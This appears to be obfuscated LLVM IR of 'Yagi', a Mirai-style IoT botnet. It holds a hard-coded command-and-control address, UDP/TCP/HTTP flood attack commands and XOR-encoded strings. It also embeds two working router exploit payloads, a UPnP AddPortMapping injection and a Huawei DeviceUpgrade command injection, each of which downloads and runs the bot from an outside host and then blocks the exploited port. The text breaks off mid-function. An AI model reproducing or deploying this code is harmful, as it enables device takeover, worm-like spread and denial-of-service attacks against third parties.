; ModuleID = 'host/ir_bcf/Yagi.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@c2_bot_port = global i32 27, align 4
@c2_http_host = global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@numattackpids = global i64 0, align 8
@UserAgents = global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@attackpids = common global i32* null, align 8
@retry = global i32 1, align 4
@retrys = global i32 3, align 4
@tryagain = global i32 1, align 4
@max_attacks = global i32 4, align 4
@maxboot_time = global i32 600, align 4
@trigger = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), align 8
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@C2 = global i32 -1, align 4
@ioctl_pid = global i32 0, align 4
@c2_host = common global [16 x i8] zeroinitializer, align 16
@Socket = common global %struct.sockaddr_in zeroinitializer, align 4
@buf = common global [1024 x i8] zeroinitializer, align 16
@buffer = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@pongresponse = common global [25 x i8] zeroinitializer, align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@exploit_scanner_pid = global i32 0, align 4
@exploit_fake_time = global i32 0, align 4
@conn_table = common global %struct.exploit_scanner_connection* null, align 8
@exploit_rsck = global i32 0, align 4
@exploit_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = global i32 0, align 4
@huawei_fake_time = global i32 0, align 4
@huawei_rsck = global i32 0, align 4
@huawei_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = common global [8 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -554832193, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x.1
  %3 = load i32, i32* @y.2
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x.1
  %19 = load i32, i32* @y.2
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %63, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %66

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @x.1
  %31 = load i32, i32* @y.2
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %29
  %38 = load i32, i32* %11, align 4
  %39 = sub nsw i32 %38, 3
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  %42 = load i32, i32* %41, align 4
  %43 = load i32, i32* %11, align 4
  %44 = sub nsw i32 %43, 2
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = xor i32 %42, %47
  %49 = xor i32 %48, -1640531527
  %50 = load i32, i32* %11, align 4
  %51 = xor i32 %49, %50
  %52 = load i32, i32* %11, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  store i32 %51, i32* %54, align 4
  %55 = load i32, i32* @x.1
  %56 = load i32, i32* @y.2
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart250, label %originalBB14alteredBB

originalBBpart250:                                ; preds = %originalBB14
  br label %63

; <label>:63:                                     ; preds = %originalBBpart250
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %11, align 4
  br label %26

; <label>:66:                                     ; preds = %26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_ = sub i32 %72, -1640531527
  %gen = mul i32 %_, -1640531527
  %_1 = shl i32 %72, -1640531527
  %_2 = shl i32 %72, -1640531527
  %_3 = shl i32 %72, -1640531527
  %_4 = sub i32 %72, -1640531527
  %gen5 = mul i32 %_4, -1640531527
  %_6 = sub i32 %72, -1640531527
  %gen7 = mul i32 %_6, -1640531527
  %_8 = sub i32 0, %72
  %gen9 = add i32 %_8, -1640531527
  %73 = add i32 %72, -1640531527
  %_10 = sub i32 0, %73
  %gen11 = add i32 %_10, -1640531527
  %_12 = sub i32 0, %73
  %gen13 = add i32 %_12, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %29
  %75 = load i32, i32* %11, align 4
  %_15 = shl i32 %75, 3
  %_16 = sub i32 0, %75
  %gen17 = add i32 %_16, 3
  %_18 = sub i32 0, %75
  %gen19 = add i32 %_18, 3
  %_20 = sub i32 %75, 3
  %gen21 = mul i32 %_20, 3
  %_22 = sub i32 0, %75
  %gen23 = add i32 %_22, 3
  %76 = sub nsw i32 %75, 3
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %77
  %79 = load i32, i32* %78, align 4
  %80 = load i32, i32* %11, align 4
  %_24 = sub i32 %80, 2
  %gen25 = mul i32 %_24, 2
  %_26 = shl i32 %80, 2
  %_27 = sub i32 0, %80
  %gen28 = add i32 %_27, 2
  %_29 = shl i32 %80, 2
  %81 = sub nsw i32 %80, 2
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %82
  %84 = load i32, i32* %83, align 4
  %_30 = shl i32 %79, %84
  %_31 = shl i32 %79, %84
  %_32 = sub i32 %79, %84
  %gen33 = mul i32 %_32, %84
  %_34 = sub i32 %79, %84
  %gen35 = mul i32 %_34, %84
  %_36 = shl i32 %79, %84
  %_37 = sub i32 %79, %84
  %gen38 = mul i32 %_37, %84
  %_39 = sub i32 0, %79
  %gen40 = add i32 %_39, %84
  %_41 = shl i32 %79, %84
  %_42 = shl i32 %79, %84
  %85 = xor i32 %79, %84
  %_43 = shl i32 %85, -1640531527
  %_44 = sub i32 0, %85
  %gen45 = add i32 %_44, -1640531527
  %86 = xor i32 %85, -1640531527
  %87 = load i32, i32* %11, align 4
  %_46 = sub i32 0, %86
  %gen47 = add i32 %_46, %87
  %_48 = shl i32 %86, %87
  %88 = xor i32 %86, %87
  %89 = load i32, i32* %11, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %90
  store i32 %88, i32* %91, align 4
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
